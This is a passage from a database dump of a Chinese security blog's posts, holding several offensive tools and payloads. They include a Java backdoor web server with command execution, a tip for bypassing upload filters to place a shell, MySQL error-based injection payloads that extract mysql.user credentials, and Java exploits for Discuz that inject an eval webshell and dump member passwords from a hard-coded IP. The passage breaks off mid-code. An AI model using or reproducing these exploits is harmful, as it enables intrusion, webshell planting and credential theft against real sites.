href=\"http://pan.baidu.com/s/1hFjGE\">ACat-src.zip</a></p>\n<p>描述：</p>\n<p>这是一个用java实现的非常小(18kb)的webServer。之前在drops发了一个简单的demo：http://drops.wooyun.org/papers/869。这个也非常简单，只实现了几个servlet的api,不过已实现了后门相关的其他功能。启动成功后会开启9527端口，然后访问:http://xxx.com:9527/api.jsp，密码：023。</p>\n<p>停止服务:http://xxx.com:9527/api.jsp?action=stop</p>\n<p>密码和端口配置在jar里面的server.properties：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/05/41.jpg\"><img class=\"alignnone size-full wp-image-1317\" src=\"http://javaweb.org/wp-content/uploads/2014/05/41.jpg\" alt=\"4\" width=\"764\" height=\"401\" /></a></p>\n<p>运行方式:java -jar ACat.jar或者在jsp里面调用。</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/05/23.jpg\"><img class=\"alignnone size-full wp-image-1312\" src=\"http://javaweb.org/wp-content/uploads/2014/05/23.jpg\" alt=\"2\" width=\"1203\" height=\"379\" /></a></p>\n<p>执行命令：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/05/32.jpg\"><img class=\"alignnone size-full wp-image-1313\" src=\"http://javaweb.org/wp-content/uploads/2014/05/32.jpg\" alt=\"3\" width=\"978\" height=\"557\" /></a></p>\n<p>加载驱动后可以连接数据库：</p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/05/15.jpg\"><img class=\"alignnone size-full wp-image-1311\" src=\"http://javaweb.org/wp-content/uploads/2014/05/15.jpg\" alt=\"1\" width=\"977\" height=\"445\" /></a></p>\n<p>如果需要连接数据库需要下载：<a href=\"http://pan.baidu.com/s/1dDtKo5F\">ACat-附数据库驱动.jar</a>，或者自行添加相关jar。</p>', null, '2014-05-26 10:06:54', '1', '600', null, '0', '2014-05-26 15:56:00'), ('1324', '1', '14', 'JavaFilter Filter“绕过”问题', '园长', '一般人喜欢用：\n<pre class=\"brush: java; gutter: true\">request.getRequestURI();</pre>\n然后再判断这个URI是否合法，其实这个写法存在弊端。很简单当请求/upload/index.jsp，由于默认的web.xml默认一般指定了index.jsp为索引文件。所以访问/upload/一样可以访问到这个jsp。只有可以绕过通过Filter拦截upload目录下的所有.jsp访问。上传shell的时候可以试试把文件名改成：index.jsp\n正确的写法应该是：\n<pre class=\"brush: java; gutter: true\">request.getServletPath()</pre>\n<p class=\"p1\">getServletPath()获取到的路径会是一个完整的Servlet路径，所以自然就无法绕过了。</p>', null, '2014-05-27 12:19:20', '1', '553', null, '1', '2014-05-27 12:20:27'), ('1339', '1', '12', 'vbs文件下载小脚本', '园长', 'linux很方便可以直接wget,windows用vbs下载挺方便的。随便在网上找了个小脚本改了下就ok了。\n<p>命令行下执行参数url：cscript 1.vbs /url:http://www.baidu.com/img/bdlogo.gif</p>\n<pre class=\"brush: vb; gutter: true\">&#039;执行后下载到当前目录:cscript 1.vbs /url:http://www.baidu.com/img/bdlogo.gif\nSet xPost = CreateObject(&quot;Microsoft.XMLHTTP&quot;)\nSet sGet = CreateObject(&quot;ADODB.Stream&quot;)\nSub DownloadToFile(url, file)\n  xPost.Open &quot;GET&quot;, url, False\n  xPost.Send\n  sGet.Type = 1\n  sGet.Open\n  sGet.Write xPost.responseBody\n  sGet.SaveToFile file, 2\n  sGet.Close\nEnd Sub\ndim url\nurl = WScript.Arguments.Named.Item(&quot;url&quot;)\ndim fileName\nfileName = Right(url, Len(url) - InStrRev(url,&quot;/&quot;))\nDownloadToFile url, fileName\n</pre>\n<p>脚本抄自:<a href=\"http://zhidao.baidu.com/link?url=HfC_pOw5xzppntNpg0Z2dLyQk4ESFF8GYrUgzA7fsBOvfmdH5oUQzWbhxjbtDMOQuPykT1EWGOixu4HPyosRIrkSQ0ojifnqgaYdKIvyYFi\">VBS下载多个文件</a></p>', null, '2014-06-16 01:58:32', '1', '563', null, '0', '2014-06-16 02:00:13'), ('1348', '1', '12', 'shodanhq.js', '园长', '登陆状态下，切换到chrome控制台:\n<pre class=\"brush: javascript; gutter: true\">var url = &quot;http://www.shodanhq.com/search?q=关键字&amp;page=&quot;;\nfor(var i=1;i&lt;101;i++){\n    var request = null;\n    if (window.ActiveXObject) {\n        request = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);\n    }else {\n        request = new XMLHttpRequest();\n    }\n    request.open(&quot;GET&quot;,url+i, false);\n    request.setRequestHeader(&#039;If-Modified-Since&#039;, &#039;0&#039;);\n    request.send(null);\n    var str = request.responseText;\n    str = str.replace(/\\r/g,&quot;&quot;);\n    str = str.replace(/\\n/g,&quot;&quot;);\n    var urls = [];\n    str.replace(/\\&lt;div class=\\&#039;ip\\&#039;&gt;.*?&lt;a href=\\&quot;.*?\\&quot;&gt;(.*?)&lt;\\/a&gt;.*?&lt;\\/div&gt;/ig, function(a,b) {\n        urls.push(b);\n    });\n    console.info(urls.join(&#039;\\n&#039;));\n}</pre>\n<p>啪~，等待结果。</p>', null, '2014-06-24 18:52:18', '1', '658', null, '0', '2014-06-24 19:16:42'), ('1355', '5', '14', '[f4ck-Mramydnei]新型Mysql报错注入', 'Anonymous', '<span style=\"color: #444444;\">from：https://rdot.org/forum/showthread.php?t=3167、http://sb.f4ck.org/thread-19159-1-1.html</span><br style=\"color: #444444;\" /><br style=\"color: #444444;\" /><span style=\"color: #444444;\">原文是俄文，不好做翻译，附上大概的内容：</span><br style=\"color: #444444;\" /><br style=\"color: #444444;\" /><span style=\"font-weight: bold; color: #444444;\">这种报错注入主要基于Mysql数据类型溢出</span>\n<pre class=\"brush: sql; gutter: true\">mysql &gt;  SELECT 18446744073709551610  *  2 ; \nERROR 1690  ( 22003 ):  BIGINT UNSIGNED value is out of range in  &#039;(18446744073709551610 * 2)&#039; \nmysql &gt;  SELECT  - 1  *  9223372036854775808 ; \nERROR 1690  ( 22003 ):  BIGINT UNSIGNED value is out of range in  &#039;(- (1) * 9223372036854775808)&#039;</pre>\n<p><span style=\"color: #444444;\">查询数据库版本：</span></p>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT * 2 (if ((SELECT * from (SELECT (version ()) ) s), 18446744073709551610, 18446744073709551610)); \nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#039;(2 * if (( Select &#039; 5.5 &#039;from Dual), 18446744073709551610.18446744073709551610))&#039;</pre>\n<p><span style=\"color: #444444;\">获取字段名称：</span></p>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT 2 * if((SELECT * from (select * from test.shop) as `` limit 1)&gt;(SELECT * from test.shop limit 1), 18446744073709551610, 18446744073709551610);\nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#039;(2 * if(((select `article`,`dealer`,`price` from (select `test`.`shop`.`article` AS `article`,`test`.`shop`.`dealer` AS `dealer`,`test`.`shop`.`price` AS `price` from `test`.`shop`) limit 1) &gt; (select `test`.`shop`.`article`,`test`.`shop`.`dealer`,`test`.`shop`.`price` from `test`.`shop` limit 1)),18446744073709551610,18446744073709551610))&#039;\n// Узнаем имена колонок в таблице</pre>\n<p><span style=\"color: #444444;\">获取字段值：</span></p>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT 2 * if((SELECT * from (select * from (mysql.user) LIMIT 1) as `` limit 1) &lt; (1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2), 18446744073709551610, 18446744073709551610);\nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#039;(2 * if(((select &#039;localhost&#039;,&#039;root&#039;,&#039;*&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;Y&#039;,&#039;&#039;,&#039;&#039;,&#039;&#039;,&#039;&#039;,&#039;0&#039;,&#039;0&#039;,&#039;0&#039;,&#039;0&#039;,&#039;&#039;,&#039;&#039; from dual limit 1) &lt; (1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2)),18446744073709551610,18446744073709551610))&#039;</pre>\n<p><span style=\"color: #444444;\">需要注意的是该方法并不适用于于老版的Mysql，除此之外你还需要了解错误信息的长度限制，因为这将决定你可以获取多长的信息：</span></p>\n<pre class=\"brush: sql; gutter: true\">mysys / my_error.c\n/* Max length of a error message. Should be kept in sync with MYSQL_ERRMSG_SIZE. */\n#define ERRMSGSIZE      (512)</pre>\n<p><span style=\"color: #444444;\">如果对象是MariaDB（Mysql的一个分支），当你尝试上面的方法时，你可能会看到这样的报错信息：</span></p>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT 2*(if((SELECT * from (SELECT (version()))s), 18446744073709551610, 18446744073709551610))\nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#039;(2 * if((select #),18446744073709551610,18446744073709551610))&#039;</pre>\n<p><span style=\"color: #444444;\">作为解决方案，可以通过这种方式来解决这个问题：</span></p>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; SELECT (i IS NOT NULL) - -9223372036854775808 FROM (SELECT (version())i)a;\nERROR 1690 (22003): BIGINT value is out of range in &#039;((&#039;5.5-MariaDB&#039; is not null) - -(9223372036854775808))&#039;</pre>\n<p><span style=\"font-weight: bold; color: #444444;\">现在让我们看看能不能让我们的Vector更短一些</span><br style=\"color: #444444;\" /><br style=\"color: #444444;\" /><span style=\"color: #444444;\">//查询数据库版本</span></p>\n<pre class=\"brush: sql; gutter: true\">SELECT 2*(if((SELECT * from (SELECT (version()))s), 18446744073709551610, 18446744073709551610))\n=\nselect 1E308*if((select*from(select version())x),2,2)</pre>\n<pre class=\"brush: sql; gutter: true\">SELECT (i IS NOT NULL) - -9223372036854775808 FROM (SELECT (version())i)a\n=\nselect if(x,2,2)*1E308 from(select version()x)y</pre>\n<p><span style=\"color: #444444;\">//获取表字段名称</span></p>\n<pre class=\"brush: sql; gutter: true\">SELECT 2 * if((SELECT * from (select * from test.shop) as `` limit 1)&gt;(SELECT * from test.shop limit 1), 18446744073709551610, 18446744073709551610)\n=\nselect 1E308*if((select*from(select*from mysql.user)``limit 1)&gt;(select*from mysql.user limit 1),2,2)</pre>\n<p><span style=\"color: #444444;\">//获取字段值</span></p>\n<pre class=\"brush: sql; gutter: true\">SELECT 2 * if((SELECT * from (select * from (mysql.user) LIMIT 1) as `` limit 1) &lt; (1,2,3,4,5,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2,3,4,5 ,6,7,8,9,0,1,2,3,4,5,6,7,8,9,0,1,2), 18446744073709551610, 18446744073709551610)\n=\nselect 1E308*if((select*from(select*from mysql.user LIMIT 1)``limit 1)&lt;(select*from mysql.user limit 0),2,2)</pre>\n<p><span style=\"color: #444444;\">//获取指定字段的值</span></p>\n<pre class=\"brush: sql; gutter: true\">select 1E308*if((select user||host||password||file_priv from(select*from mysql.user LIMIT 1)a limit 1),2,2)</pre>\n<span style=\"color: #444444;\">//获取字段个数</span>\n<pre class=\"brush: sql; gutter: true\"> select 1E308*if((select*from mysql.user limit 1)&gt;(select 1),2,2)</pre>\n<span style=\"font-weight: bold; color: #444444;\">其它的一些变形</span>\n<pre class=\"brush: sql; gutter: true\"> SELECT (i IS NOT NULL) - -9223372036854775808 FROM (SELECT (version())i)a</pre>\n<pre class=\"brush: sql; gutter: true\">select 1E308*if((select user||host||password||file_priv from(select*from mysql.user LIMIT 1)a limit 1),2,2);\n=&gt;\nselect 2*if((select user|host|password|file_priv from(select*from mysql.user LIMIT 1)a limit 1),1e308,0);</pre>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; select (select * from mysql.user)=1;\nmysql&gt; select (select * from mysql.user)in(1);\nERROR 1241 (21000): Operand should contain 42 column(s)</pre>\n<pre class=\"brush: sql; gutter: true\"> select 2*if((select user|host|password|file_priv from(select*from mysql.user LIMIT 1)a limit 1),1e308,0);</pre>\n<pre class=\"brush: sql; gutter: true\"> select if((select user||host||password||file_priv from(select*from mysql.user LIMIT 1)a limit 1),2,2)*1E308</pre>\n<pre class=\"brush: sql; gutter: true\"> SELECT (i IS NOT NULL) - -9223372036854775808 FROM (SELECT (version())i)a</pre>\n<pre class=\"brush: sql; gutter: true\"> select (x!=0x00)--9223372036854775808 from(SELECT version()x)y</pre>\n<pre class=\"brush: sql; gutter: true\">mysql&gt; select!x-~0.FROM(select+user()x)f;\nERROR 1690 (22003): BIGINT UNSIGNED value is out of range in &#039;((not(&#039;root@localhost&#039;)) - ~(0))&#039;</pre>\n<p><span style=\"color: #444444;\">看到有人说，尝试无果期待验证……  附上一张截图</span></p>\n<p><a href=\"http://javaweb.org/wp-content/uploads/2014/06/11.jpg\"><img class=\"alignnone size-full wp-image-1356\" src=\"http://javaweb.org/wp-content/uploads/2014/06/11.jpg\" alt=\"1\" width=\"774\" height=\"450\" /></a></p>', null, '2014-06-25 23:35:23', '1', '886', null, '0', '2014-06-25 23:37:18'), ('1366', '1', '3', 'java 实现Discuz UC_KEY GetShell', '园长', 'Discuz自身提供了一个函数_authcode，实现了自身的Encode和Decode。这里写了一段代码，基本翻译了Discuz的Encode部分。代码没什么难点，麻烦的是如果你用Java去实现Encode会发现里面有许多的坑。我写了俩php的函数microtime();和time();的实现。用Map替换了PHP的range函数，其次需要注意的是php的chr，chr返回的是Java里的byte(在这里被坑了好久...)。\n<p>附了一个忽略SSL安全证书验证的工具类，Base64用了apache的commons-codec-1.5.jar,IO操作用了apache的commons-io-2.2.jar。</p>\n<p><p class=\"p1\"><strong>DZ.java:</strong></p></p>\n<pre class=\"brush: java; gutter: true\">import java.io.ByteArrayOutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.net.URLEncoder;\nimport java.util.ArrayList;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\nimport org.apache.commons.codec.binary.Base64;\nimport org.apache.commons.codec.digest.DigestUtils;\nimport org.apache.commons.io.IOUtils;\npublic class DZ {\n	/**\n	 * 模拟PHP的microtime函数\n	 * @return\n	 */\n	public static String microtime(){\n		String a = String.valueOf(System.nanoTime());\n		return &quot;0.&quot;+a.substring(10,a.length()-1)+&quot; &quot;+a.substring(0,10);\n	}\n	/**\n	 * 拼byte数组\n	 * @param b\n	 * @return\n	 */\n	protected static byte[] toByteArray(Byte[] b) {\n		ByteArrayOutputStream bos = new ByteArrayOutputStream();\n		for (byte bs : b) {\n			bos.write(bs);\n		}\n		return bos.toByteArray();\n	}\n	/**\n	 * Discuz 授权 Encode\n	 * @param $string\n	 * @param ucKey\n	 * @return\n	 */\n	public static String auth(String $string,String ucKey){\n		int $ckey_length = 4;\n		String $key = DigestUtils.md5Hex(ucKey);\n		String $keya = DigestUtils.md5Hex($key.substring(0,16));\n		String $keyb = DigestUtils.md5Hex($key.substring(16,32));\n		String microtime = DigestUtils.md5Hex(microtime());\n		String $keyc = microtime.substring(microtime.length()-$ckey_length,microtime.length());\n		String $cryptkey = $keya+DigestUtils.md5Hex($keya+$keyc);\n		String sb = DigestUtils.md5Hex($string+$keyb).substring(0,16);\n		$string = String.format(&quot;%010d&quot;, 0 )+sb+$string;\n		int $string_length = $string.length();\n		Map&lt;Integer,Integer&gt; box = new LinkedHashMap&lt;Integer, Integer&gt;();\n		for (int i = 0; i &lt;= 255; i++) {\n			box.put(i, i);\n		}\n		List&lt;Integer&gt; ls = new ArrayList&lt;Integer&gt;();\n		char[] $cryptkeyArray = $cryptkey.toCharArray();\n		int r = 0;\n		for (int i = 0; i &lt;= 255; i++) {\n			r = r==$cryptkeyArray.length?0:r;\n			ls.add((int)$cryptkeyArray[r]);\n			r ++;\n		}\n		int p = 0;\n		for(int i= 0; i &lt; 256; i++) {\n			int $tmp = (Integer)box.get(i);\n			p = (p+$tmp + ls.get(i)) % 256;\n			box.put(i, box.get(p));\n			box.put(p, $tmp);\n		}\n		List&lt;Byte&gt; bs = new ArrayList&lt;Byte&gt;();\n		char[] $stringArray = $string.toCharArray();\n		int a=0,j=0;\n		for(int i = 0; i &lt; $string_length; i++) {\n	        a = (a + 1) % 256;\n	        j = (j + box.get(a)) % 256;\n	        int $tmp = box.get(a);\n	        box.put(a, box.get(j));\n	        box.put(j, $tmp);\n	        int s = ((int)$stringArray[i] ^ box.get((box.get(a) + box.get(j)) % 256));\n	        bs.add((byte)s);\n	    }\n		byte[] bb = toByteArray(bs.toArray(new Byte[bs.size()]));\n		return $keyc+(Base64.encodeBase64String(bb).replace(&quot;=&quot;, &quot;&quot;));\n	}\n	/**\n	 * 模拟PHP的time函数\n	 * @return\n	 */\n	public static String time(){\n		return String.valueOf(System.currentTimeMillis()).substring(0,10);\n	}\n	/**\n	 * 发送POST请求\n	 * @param $cmd\n	 * @param $url\n	 * @param timeOut\n	 * @return\n	 */\n	public static String send(String $cmd,String $url,int timeOut){\n		try {\n	    	URL u = new URL($url);\n	    	//忽略HTTPS请求证书验证\n	    	if(&quot;https&quot;.equalsIgnoreCase(u.getProtocol())){\n				SslUtils.ignoreSsl();\n			}\n	    	URLConnection conn = u.openConnection();\n			conn.setConnectTimeout(timeOut);\n			conn.setReadTimeout(timeOut);\n			conn.setDoOutput(true);\n			conn.setDoInput(true);\n			conn.getOutputStream().write($cmd.getBytes());\n			return IOUtils.toString(conn.getInputStream(),&quot;UTF-8&quot;);\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n		return $url;\n	}\n	public static void main(String[] args) {\n		String $url = &quot;http://192.168.199.230/api/uc.php?code=&quot;;//URL 地址\n		String ucKey = &quot;re67v405CbJ0A5G8Wck6y7d552x1NcY0L1U6O340v2c7P4ecb6m2P611YdZ2A8De&quot;;//UC KEY\n		String timestamp = String.valueOf(Long.parseLong(time())+10*3600);\n		try {\n			String $code = URLEncoder.encode(auth(&quot;time=&quot;+timestamp+&quot;&amp;action=updateapps&quot;, ucKey),&quot;UTF-8&quot;);\n			String $cmd1=&quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;ISO-8859-1\\&quot;?&gt;&lt;root&gt;&lt;item id=\\&quot;UC_API\\&quot;&gt;xxx\\&#039;);eval($_POST[cmd]);//&lt;/item&gt;&lt;/root&gt;&quot;;\n			String $cmd2=&quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;ISO-8859-1\\&quot;?&gt;&lt;root&gt;&lt;item id=\\&quot;UC_API\\&quot;&gt;aaa&lt;/item&gt;&lt;/root&gt;&quot;;\n			String $html1 = send($cmd1, $url+$code, 5000);\n			System.out.println($html1);\n			String $html2 = send($cmd2, $url+$code, 5000);\n			System.out.println($html2);\n		} catch (UnsupportedEncodingException e) {\n			e.printStackTrace();\n		}\n	}\n}</pre>\n<p><p class=\"p1\"><strong>SslUtils.java:</strong></p></p>\n<pre class=\"brush: java; gutter: true\">import java.security.cert.CertificateException;\nimport java.security.cert.X509Certificate;\nimport javax.net.ssl.HostnameVerifier;\nimport javax.net.ssl.HttpsURLConnection;\nimport javax.net.ssl.SSLContext;\nimport javax.net.ssl.SSLSession;\nimport javax.net.ssl.TrustManager;\nimport javax.net.ssl.X509TrustManager;\npublic class SslUtils {\n	private static void trustAllHttpsCertificates() throws Exception {\n		TrustManager[] trustAllCerts = new TrustManager[1];\n		TrustManager tm = new miTM();\n		trustAllCerts[0] = tm;\n		SSLContext sc = SSLContext.getInstance(&quot;SSL&quot;);\n		sc.init(null, trustAllCerts, null);\n		HttpsURLConnection.setDefaultSSLSocketFactory(sc.getSocketFactory());\n	}\n	static class miTM implements TrustManager,X509TrustManager {\n		public X509Certificate[] getAcceptedIssuers() {\n			return null;\n		}\n		public boolean isServerTrusted(X509Certificate[] certs) {\n			return true;\n		}\n		public boolean isClientTrusted(X509Certificate[] certs) {\n			return true;\n		}\n		public void checkServerTrusted(X509Certificate[] certs, String authType)\n				throws CertificateException {\n			return;\n		}\n		public void checkClientTrusted(X509Certificate[] certs, String authType)\n				throws CertificateException {\n			return;\n		}\n	}\n	/**\n	 * 忽略HTTPS请求的SSL证书，必须在openConnection之前调用\n	 * @throws Exception\n	 */\n	public static void ignoreSsl() throws Exception{\n		HostnameVerifier hv = new HostnameVerifier() {\n			public boolean verify(String urlHostName, SSLSession session) {\n				System.out.println(&quot;Warning: URL Host: &quot; + urlHostName + &quot; vs. &quot; + session.getPeerHost());\n				return true;\n			}\n		};\n		trustAllHttpsCertificates();\n		HttpsURLConnection.setDefaultHostnameVerifier(hv);\n	}\n}</pre>', null, '2014-07-04 17:42:24', '1', '564', null, '2', '2014-07-04 17:45:36');
INSERT INTO `sys_posts` VALUES ('1370', '1', '3', 'Discuz7.2.java', '园长', '检测shell、获取基本信息、列当前数据下举所有表、统计会员数量、输出前20位会员id+密码+email、getshell\n<pre class=\"brush: java; gutter: true\">import java.io.ByteArrayOutputStream;\nimport java.io.UnsupportedEncodingException;\nimport java.net.URL;\nimport java.net.URLConnection;\nimport java.net.URLEncoder;\nimport java.util.ArrayList;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.Map;\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\nimport org.apache.commons.codec.binary.Base64;\nimport org.apache.commons.codec.digest.DigestUtils;\nimport org.apache.commons.io.IOUtils;\npublic class Discuz extends Thread {\n	static int i = 0;\n	/**\n	 * 模拟PHP的microtime函数\n	 * @return\n	 */\n	public static String microtime(){\n		String a = String.valueOf(System.nanoTime());\n		return &quot;0.&quot;+a.substring(10,a.length()-1)+&quot; &quot;+a.substring(0,10);\n	}\n	/**\n	 * 拼byte数组\n	 * @param b\n	 * @return\n	 */\n	protected static byte[] toByteArray(Byte[] b) {\n		ByteArrayOutputStream bos = new ByteArrayOutputStream();\n		for (byte bs : b) {\n			bos.write(bs);\n		}\n		return bos.toByteArray();\n	}\n	/**\n	 * Discuz 授权 Encode\n	 * @param $string\n	 * @param ucKey\n	 * @return\n	 */\n	public static String auth(String $string,String ucKey){\n		int $ckey_length = 4;\n		String $key = DigestUtils.md5Hex(ucKey);\n		String $keya = DigestUtils.md5Hex($key.substring(0,16));\n		String $keyb = DigestUtils.md5Hex($key.substring(16,32));\n		String microtime = DigestUtils.md5Hex(microtime());\n		String $keyc = microtime.substring(microtime.length()-$ckey_length,microtime.length());\n		String $cryptkey = $keya+DigestUtils.md5Hex($keya+$keyc);\n		String sb = DigestUtils.md5Hex($string+$keyb).substring(0,16);\n		$string = String.format(&quot;%010d&quot;, 0 )+sb+$string;\n		int $string_length = $string.length();\n		Map&lt;Integer,Integer&gt; box = new LinkedHashMap&lt;Integer, Integer&gt;();\n		for (int i = 0; i &lt;= 255; i++) {\n			box.put(i, i);\n		}\n		List&lt;Integer&gt; ls = new ArrayList&lt;Integer&gt;();\n		char[] $cryptkeyArray = $cryptkey.toCharArray();\n		int r = 0;\n		for (int i = 0; i &lt;= 255; i++) {\n			r = r==$cryptkeyArray.length?0:r;\n			ls.add((int)$cryptkeyArray[r]);\n			r ++;\n		}\n		int p = 0;\n		for(int i= 0; i &lt; 256; i++) {\n			int $tmp = (Integer)box.get(i);\n			p = (p+$tmp + ls.get(i)) % 256;\n			box.put(i, box.get(p));\n			box.put(p, $tmp);\n		}\n		List&lt;Byte&gt; bs = new ArrayList&lt;Byte&gt;();\n		char[] $stringArray = $string.toCharArray();\n		int a=0,j=0;\n		for(int i = 0; i &lt; $string_length; i++) {\n	        a = (a + 1) % 256;\n	        j = (j + box.get(a)) % 256;\n	        int $tmp = box.get(a);\n	        box.put(a, box.get(j));\n	        box.put(j, $tmp);\n	        int s = ((int)$stringArray[i] ^ box.get((box.get(a) + box.get(j)) % 256));\n	        bs.add((byte)s);\n	    }\n		byte[] bb = toByteArray(bs.toArray(new Byte[bs.size()]));\n		return $keyc+(Base64.encodeBase64String(bb).replace(&quot;=&quot;, &quot;&quot;));\n	}\n	/**\n	 * 模拟PHP的time函数\n	 * @return\n	 */\n	public static String time(){\n		return String.valueOf(System.currentTimeMillis()).substring(0,10);\n	}\n	/**\n	 * 发送POST请求\n	 * @param $cmd\n	 * @param $url\n	 * @param timeOut\n	 * @return\n	 */\n	public static String send(String $cmd,String $url,int timeOut){\n		try {\n	    	URL u = new URL($url);\n	    	//忽略HTTPS请求证书验证\n	    	if(&quot;https&quot;.equalsIgnoreCase(u.getProtocol())){\n				SslUtils.ignoreSsl();\n			}\n	    	URLConnection conn = u.openConnection();\n			conn.setConnectTimeout(timeOut);\n			conn.setReadTimeout(timeOut);\n			conn.setDoOutput(true);\n			conn.setDoInput(true);\n			conn.getOutputStream().write($cmd.getBytes());\n			return IOUtils.toString(conn.getInputStream(),&quot;UTF-8&quot;);\n		} catch (Exception e) {\n			e.printStackTrace();\n		}\n		return $url;\n	}\n	public void test(String $url,String ucKey){\n		String timestamp = String.valueOf(Long.parseLong(time())+10*3600);\n		try {\n			String $code = URLEncoder.encode(auth(&quot;time=&quot;+timestamp+&quot;&amp;action=updateapps&quot;, ucKey),&quot;UTF-8&quot;);\n			String $cmd1=&quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;ISO-8859-1\\&quot;?&gt;&lt;root&gt;&lt;item id=\\&quot;UC_API\\&quot;&gt;xxx\\&#039;);eval($_POST[xxs]);//&lt;/item&gt;&lt;/root&gt;&quot;;\n			String $cmd2=&quot;&lt;?xml version=\\&quot;1.0\\&quot; encoding=\\&quot;ISO-8859-1\\&quot;?&gt;&lt;root&gt;&lt;item id=\\&quot;UC_API\\&quot;&gt;aaa&lt;/item&gt;&lt;/root&gt;&quot;;\n			String $html1 = send($cmd1, $url+$code, 5000);\n			System.out.println($html1);\n			String $html2 = send($cmd2, $url+$code, 5000);\n			System.out.println($html2);\n		} catch (UnsupportedEncodingException e) {\n			e.printStackTrace();\n		}\n	}\n	public static String getRequest(String url,String action,int timeOut) throws Exception{\n		URL u = new URL(url);\n		URLConnection conn = u.openConnection();\n		conn.setConnectTimeout(timeOut);\n		conn.setReadTimeout(timeOut);\n		conn.setDoOutput(true);\n		conn.getOutputStream().write(action.getBytes());\n		return IOUtils.toString(conn.getInputStream(),&quot;GBK&quot;);\n	}\n	public synchronized int get(){\n		return i++;\n	}\n	public String getR(String url,String action) throws Exception{\n		String str = getRequest(url,action,5000);\n		String reg = &quot;\\\\{#(.*)#\\\\}&quot;;\n		Matcher m = Pattern.compile(reg).matcher(str);\n		if(m.find()){\n			return m.group(1);\n		}\n		return &quot;&quot;;\n	}\n	public void startX(){\n		String url = &quot;http://218.249.66.48/dz7.2/faq.php&quot;;\n		String exp = &quot;action=grouppermission&amp;gids[99]=&#039;&amp;gids[100][0]=) and (select 1 from (select count(*),concat(floor(rand(0)*2),0x3a,($sql),0x3a)x from information_schema.tables group by x)a)%23&quot;;\n		try {\n			System.out.println(&quot;-----------------------检查是否存在shell----------------------&quot;);\n			String t = url.substring(0,url.indexOf(&quot;faq.php&quot;));\n			String[] arr = &quot;cmd,xxx,a,cao,i0day,caonima,2119,air,config,moon,1,moi1,DOM,g,pwd,xss&quot;.split(&quot;,&quot;);\n			for (int i = 0; i &lt; arr.length; i++) {\n				String y = send(arr[i]+&quot;=echo 12345;&quot;, t+&quot;/config.inc.php&quot;, 5000);\n				if(y.contains(&quot;12345&quot;)){\n					System.out.println(&quot;Shell:&quot;+t+&quot;/config.inc.php\\t\\t密码:&quot;+arr[i]+&quot;\\r\\n&quot;);\n					return ;\n				}\n			}\n			System.out.println(&quot;---------------------info------------------------&quot;);\n			String info = getR(url, exp.replace(&quot;$sql&quot;, &quot;select concat(0x7b,0x23,version(),0x23,user(),0x23,database(),0x23,0x7D) from INFORMATION_SCHEMA.TABLES where table_schema=database()  limit 0,1&quot;));\n			System.out.println(info);\n			int len1 = Integer.parseInt(getR(url, exp.replace(&quot;$sql&quot;, &quot;select concat(0x7b,0x23,count(1),0x23,0x7D) from INFORMATION_SCHEMA.TABLES where table_schema=database() limit 0,1&quot;)));\n			String pre = &quot;cdb&quot;;\n			String applications = &quot;cdb_uc_applications&quot;;\n			System.out.println(&quot;----------------------table-----------------------&quot;);\n			boolean install = false;\n			for (int i = 0; i &lt; len1; i++) {\n				String str = getR(url, exp.replace(&quot;$sql&quot;, &quot;select concat(0x7b,0x23,table_name,0x23,0x7D) from INFORMATION_SCHEMA.TABLES where table_schema=database() limit &quot;+i+&quot;,1&quot;)).replace(&quot;[Table]&quot;, &quot;cdb_&quot;);\n				if(str.contains(&quot;forums&quot;)){\n					pre = str.indexOf(&quot;_&quot;)!=-1?str.substring(0,str.indexOf(&quot;_&quot;)+1):&quot;&quot;;\n				}\n				if(str.contains(&quot;applications&quot;)){\n					applications = str;\n					install = true;\n				}\n				System.out.println(str);\n			}\n			System.out.println(&quot;---------------------members------------------------&quot;);\n			try {\n				int len2 = Integer.parseInt(getR(url, exp.replace(&quot;$sql&quot;, &quot;select concat(0x7b,0x23,count(1),0x23,0x7D) from &quot;+pre+&quot;members&quot; +&quot; limit 0,1&quot;)));\n				System.out.println(&quot;会员总数量:&quot;+len2);\n				for (int i = 0; i &lt; (len2&gt;20?20:len2);i++) {\n					String str = getR(url, exp.replace(&quot;$sql&quot;, &quot;select 